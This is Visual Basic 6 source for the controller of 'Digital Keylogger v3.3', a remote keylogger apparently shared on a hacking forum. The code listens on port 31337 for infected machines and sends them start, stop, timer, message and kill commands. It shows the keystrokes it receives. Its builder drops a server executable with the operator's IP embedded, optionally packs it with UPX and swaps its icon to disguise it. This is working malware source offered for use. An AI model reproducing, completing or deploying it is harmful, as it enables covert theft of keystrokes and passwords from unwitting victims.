VERSION 5.00
Begin VB.Form Keylogger 
   BackColor       =   &H00000000&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Digital Keylogger v3.3 Private Version"
   ClientHeight    =   9720
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   9510
   DrawMode        =   5  'Not Copy Pen
   DrawStyle       =   2  'Dot
   DrawWidth       =   10
   FillColor       =   &H00404040&
   ForeColor       =   &H8000000E&
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   Picture         =   "Form1.frx":030A
   ScaleHeight     =   648
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   634
   StartUpPosition =   2  'CenterScreen
   Begin VB.CheckBox Check1 
      Caption         =   "Check1"
      Height          =   225
      Left            =   1080
      TabIndex        =   29
      Top             =   1350
      Value           =   1  'Checked
      Width           =   225
   End
   Begin VB.CheckBox Option2 
      Caption         =   "Check2"
      Height          =   225
      Left            =   360
      TabIndex        =   27
      Top             =   4500
      Width           =   225
   End
   Begin VB.CheckBox Option1 
      Caption         =   "Check1"
      Height          =   225
      Left            =   360
      TabIndex        =   26
      Top             =   3450
      Value           =   1  'Checked
      Width           =   225
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP14 
      Height          =   375
      Left            =   1440
      TabIndex        =   24
      Top             =   1800
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   661
      Caption         =   "Build"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP13 
      Height          =   375
      Left            =   2640
      TabIndex        =   22
      Top             =   705
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
      Caption         =   "Choose"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP12 
      Height          =   375
      Left            =   7680
      TabIndex        =   15
      Top             =   180
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   661
      Caption         =   "System Tray"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP11 
      Height          =   375
      Left            =   7200
      TabIndex        =   14
      Top             =   9120
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
      Caption         =   "Save Keylog"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP10 
      Height          =   375
      Left            =   5160
      TabIndex        =   13
      Top             =   9120
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
      Caption         =   "Clear Keylog"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP9 
      Height          =   375
      Left            =   2520
      TabIndex        =   12
      Top             =   8160
      Width           =   855
      _ExtentX        =   1508
      _ExtentY        =   661
      Caption         =   "No"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP8 
      Height          =   375
      Left            =   1080
      TabIndex        =   11
      Top             =   8160
      Width           =   855
      _ExtentX        =   1508
      _ExtentY        =   661
      Caption         =   "Yes"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP7 
      Height          =   375
      Left            =   2880
      TabIndex        =   10
      Top             =   7200
      Width           =   975
      _ExtentX        =   1720
      _ExtentY        =   661
      Caption         =   "Send"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP6 
      Height          =   375
      Left            =   2400
      TabIndex        =   9
      Top             =   6210
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
      Caption         =   "Kill Server"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP5 
      Height          =   375
      Left            =   720
      TabIndex        =   8
      Top             =   6210
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
      Caption         =   "Close Y!"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP4 
      Height          =   375
      Left            =   1560
      TabIndex        =   7
      Top             =   4920
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   661
      Caption         =   "Get Keylog"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP3 
      Height          =   375
      Left            =   2280
      TabIndex        =   6
      Top             =   3960
      Width           =   975
      _ExtentX        =   1720
      _ExtentY        =   661
      Caption         =   "Set"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP2 
      Height          =   375
      Left            =   2520
      TabIndex        =   5
      Top             =   2925
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   661
      Caption         =   "Stop"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP ButtonXP1 
      Height          =   375
      Left            =   960
      TabIndex        =   4
      Top             =   2925
      Width           =   1095
      _ExtentX        =   1931
      _ExtentY        =   661
      Caption         =   "Start"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin VB.TextBox Text4 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   360
      TabIndex        =   3
      Text            =   "http://rstcenter.com"
      Top             =   7200
      Width           =   2295
   End
   Begin VB.PictureBox Picture1 
      AutoSize        =   -1  'True
      Height          =   300
      Left            =   9840
      Picture         =   "Form1.frx":FE83
      ScaleHeight     =   240
      ScaleWidth      =   240
      TabIndex        =   2
      Top             =   8280
      Visible         =   0   'False
      Width           =   300
   End
   Begin VB.TextBox Text2 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   8175
      Left            =   4320
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   1
      Text            =   "Form1.frx":10CC5
      Top             =   720
      Width           =   4905
   End
   Begin VB.TextBox Text3 
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   1440
      TabIndex        =   0
      Text            =   "3000"
      Top             =   3960
      Width           =   495
   End
   Begin VB.Label Label10 
      BackStyle       =   0  'Transparent
      Caption         =   "Pack with UPX "
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   1440
      TabIndex        =   30
      Top             =   1335
      Width           =   2055
   End
   Begin VB.Label Label9 
      BackColor       =   &H8000000E&
      BackStyle       =   0  'Transparent
      Caption         =   "Get Keylog Manual"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   720
      TabIndex        =   28
      Top             =   4440
      Width           =   3015
   End
   Begin VB.Label Label8 
      BackStyle       =   0  'Transparent
      Caption         =   "Get Keylog Automaticaly"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   720
      TabIndex        =   25
      Top             =   3405
      Width           =   3495
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00FFFFFF&
      X1              =   288
      X2              =   0
      Y1              =   368
      Y2              =   368
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00FFFFFF&
      X1              =   288
      X2              =   0
      Y1              =   160
      Y2              =   160
   End
   Begin VB.Label Label7 
      BackStyle       =   0  'Transparent
      Caption         =   "Icon :"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   720
      TabIndex        =   23
      Top             =   720
      Width           =   735
   End
   Begin VB.Image Image1 
      Height          =   480
      Left            =   1800
      Picture         =   "Form1.frx":10D0C
      Top             =   720
      Width           =   480
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "Build Server"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   1440
      TabIndex        =   21
      Top             =   240
      Width           =   1575
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "(c) www.rstcenter.com 2009"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   495
      Left            =   600
      TabIndex        =   20
      Top             =   8760
      Width           =   3375
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Use Backspace ?"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   1200
      TabIndex        =   19
      Top             =   7680
      Width           =   2175
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Send Message"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   1440
      TabIndex        =   18
      Top             =   6720
      Width           =   1935
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Options"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   1680
      TabIndex        =   17
      Top             =   5760
      Width           =   1215
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Keylogging"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   495
      Left            =   1440
      TabIndex        =   16
      Top             =   2520
      Width           =   1815
   End
End
Attribute VB_Name = "Keylogger"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' #################################################################
'       Digital Keylogger v3.3 Client [ Private Edition ]
'                      Author: Nytro
'             http://www.rstcenter.com/forum/
' #################################################################

Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Public WithEvents Winsock1 As CSocketMaster
Attribute Winsock1.VB_VarHelpID = -1
Dim sIco As String

Private Type NOTIFYICONDATA
   cbSize As Long
   hwnd As Long
   uID As Long
   uFlags As Long
   uCallbackMessage As Long
   hIcon As Long
   szTip As String * 128
   dwState As Long
   dwStateMask As Long
   szInfo As String * 256
   uTimeout As Long
   szInfoTitle As String * 64
   dwInfoFlags As Long
End Type

Private Declare Function Shell_NotifyIcon Lib "shell32" Alias "Shell_NotifyIconA" (ByVal dwMessage As Long, lpData As NOTIFYICONDATA) As Long

Private TaskIcon As NOTIFYICONDATA
Private Const NIM_ADD = &H0
Private Const NIM_MODIFY = &H1
Private Const NIM_DELETE = &H2
Private Const NIF_MESSAGE = &H1
Private Const NIF_ICON = &H2
Private Const NIF_TIP = &H4
Private Const WM_MOUSEMOVE = &H200

Private Sub RemoveIconFromTaskBar()

Shell_NotifyIcon NIM_DELETE, TaskIcon
End Sub

Private Sub ButtonXP1_Click()

If Winsock1.State = 7 Then
Winsock1.SendData "Start"
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
End Sub

Private Sub ButtonXP10_Click()

Text2.Text = ""
End Sub

Private Sub ButtonXP11_Click()

Dim strx As String
strx = GetFileName(strx, "Text Files|*.txt", "Save Log", False)
If strx <> "" Then
    Open strx & ".txt" For Output As #1
    Print #1, Text2.Text & vbCrLf & vbCrLf
    Close #1
End If

End Sub

Private Sub ButtonXP12_Click()

LoadIconToTaskBar
Me.Hide
      With TaskIcon
        .cbSize = Len(TaskIcon)
        .hwnd = Picture1.hwnd
        .uID = vbNull
        .uFlags = NIF_ICON Or NIF_INFO Or NIF_MESSAGE Or NIF_TIP
        .uCallbackMessage = WM_MOUSEMOVE
        .hIcon = Picture1.Picture
        .szTip = "Digital Keylogger" & vbNullChar
        .dwState = 0
        .dwStateMask = 0
        .szInfo = "Digital Keylogger will run hidden" & Chr(0)
        .szInfoTitle = "Digital Keylogger" & Chr(0)
        .dwInfoFlags = NIIF_INFO
        .uTimeout = 3000
   End With
        Shell_NotifyIcon NIM_MODIFY, TaskIcon
End Sub

Private Sub ButtonXP13_Click()

  sIco = GetFileName(sIco, "Icons|*.ico")
  If sIco <> "" Then Image1.Picture = LoadPicture(sIco)
End Sub

Private Sub ButtonXP14_Click()

Dim Errx As String

Dim Buffer() As Byte
Buffer = LoadResData(105, "CUSTOM")

Open App.Path & "\" & "DK_Server.exe" For Binary As #1
Put #1, , Buffer
Put #1, , "|||"
Put #1, , Winsock1.LocalIP
Close #1

If Check1.Value = 1 Then
Shell Chr(34) & Environ("Temp") & "\upx.exe" & Chr(34) & " " & Chr(34) & App.Path & "\" & "DK_Server.exe" & Chr(34)
End If

If sIco <> "" Then
ReplaceIcons sIco, App.Path & "\" & "DK_Server.exe", Errx
End If

MsgBox "Server built" & vbCrLf & App.Path & "\" & "DK_Server.exe", vbInformation, "Digital Keylogger v3.3"

End Sub

Private Sub ButtonXP2_Click()

If Winsock1.State = 7 Then
Winsock1.SendData "Stop"
Text2.Text = Text2.Text & vbCrLf & vbCrLf & "Keylogg Stopped" & vbCrLf & vbCrLf
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If

End Sub

Private Sub ButtonXP3_Click()

Option1.Value = 1
Option2.Value = 0
If Winsock1.State = 7 Then
Winsock1.SendData "Timer|" + Text3.Text
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
End Sub

Private Sub ButtonXP4_Click()

Option2.Value = 1
Option1.Value = 0
If Winsock1.State = 7 Then
Winsock1.SendData "Manual"
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
End Sub

Private Sub ButtonXP5_Click()

If Winsock1.State = 7 Then
Winsock1.SendData "Yahoo"
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
End Sub

Private Sub ButtonXP6_Click()

If Winsock1.State = 7 Then
Winsock1.SendData "KillServer"
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
End Sub

Private Sub ButtonXP7_Click()

If Winsock1.State = 7 Then
Winsock1.SendData "Message|" + Text4.Text
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
End Sub

Private Sub ButtonXP8_Click()

If Winsock1.State = 7 Then
Winsock1.SendData "Yes"
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
End Sub

Private Sub ButtonXP9_Click()

If Winsock1.State = 7 Then
Winsock1.SendData "No"
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
End Sub

Private Sub Form_Initialize()

If App.PrevInstance = True Then Unload Me

If Dir(Environ("Temp") & "\upx.exe") = "" Then

Dim k() As Byte
k = LoadResData(106, "CUSTOM")
Open Environ("Temp") & "\upx.exe" For Binary Access Write As #3
Put #3, , k
Close #3

End If

End Sub

Private Sub Form_Load()

If Dir(Environ("Temp") & "\upx.exe") = "" Then

Dim k() As Byte
k = LoadResData(106, "CUSTOM")
Open Environ("Temp") & "\upx.exe" For Binary Access Write As #3
Put #3, , k
Close #3

End If

Set Winsock1 = New CSocketMaster
Winsock1.Bind 31337
Winsock1.Listen
    
End Sub

Private Sub LoadIconToTaskBar()

TaskIcon.cbSize = Len(TaskIcon)
TaskIcon.hwnd = Picture1.hwnd
TaskIcon.uID = 1&
TaskIcon.uFlags = NIF_MESSAGE Or NIF_ICON Or NIF_TIP
TaskIcon.uCallbackMessage = WM_MOUSEMOVE
TaskIcon.hIcon = Picture1.Picture
TaskIcon.szTip = "Digital Keylogger 3.3" & Chr$(0)
Shell_NotifyIcon NIM_ADD, TaskIcon

End Sub

Private Sub Form_Unload(Cancel As Integer)

RemoveIconFromTaskBar
Winsock1.CloseSck
End Sub

Private Sub Label5_Click()

ShellExecute Me.hwnd, "", "http://rstcenter.com/forum/index.php", 0, 0, 0
End Sub


Private Sub Label8_Click()

Option1.Value = 1
Option2.Value = 0
If Winsock1.State = 7 Then
ButtonXP3_Click
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
End Sub

Private Sub Option3_Click()

MsgBox "Attention ! You need a very good Internet speed !", vbInformation, "Digital Keylogger v3.3"
Winsock1.SendData "Live"
End Sub

Private Sub Label9_Click()

Option1.Value = 0
Option2.Value = 1
If Winsock1.State = 7 Then
ButtonXP4_Click
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
End Sub

Private Sub Option1_Click()

If Option1.Value = 1 Then
Option2.Value = 0
End If
End Sub

Private Sub Option2_Click()

If Option2.Value = 1 Then
Option1.Value = 0
End If
End Sub

Private Sub Picture1_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)

If Button = 1 Then
Me.Show
RemoveIconFromTaskBar
End If
End Sub

Private Sub Text2_Change()

Text2.SelStart = Len(Text2.Text)
End Sub

Private Sub Winsock1_Close()

Me.Caption = "Digital Keylogger v3.3 Closed"
Winsock1.CloseSck
Winsock1.LocalPort = 31337
Winsock1.Listen
End Sub

Private Sub Winsock1_Connect()

Me.Caption = "Digital Keylogger v3.3 Connected"
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)

If Winsock1.State <> 7 Then
Winsock1.CloseSck
Winsock1.Accept requestID
End If
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)


    Dim NData() As String
    Dim TString As String
    Dim data As String
    Winsock1.GetData data
    NData = Split(data, "|")
    Select Case NData(0)
    
    Case "Keylog":
        Text2.Text = Text2.Text & NData(1)
        
    Case "IP":
     If NData(2) = "" Then
     Connected.started = 0
     Else
     Connected.started = 1
     End If
        
        Connected.Caption = "Connected to " & NData(1)
        Connected.Label4.Caption = NData(1)
        Connected.Label2 = NData(3)
        Connected.Label3 = NData(4)
        Connected.Show
        Me.Caption = "Digital Keylogger v3.3 - Connected"
     
    End Select

End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)

Me.Caption = "Digital Keylogger v3.3 Error"
Winsock1.CloseSck
Winsock1.LocalPort = 31337
Winsock1.Listen
End Sub


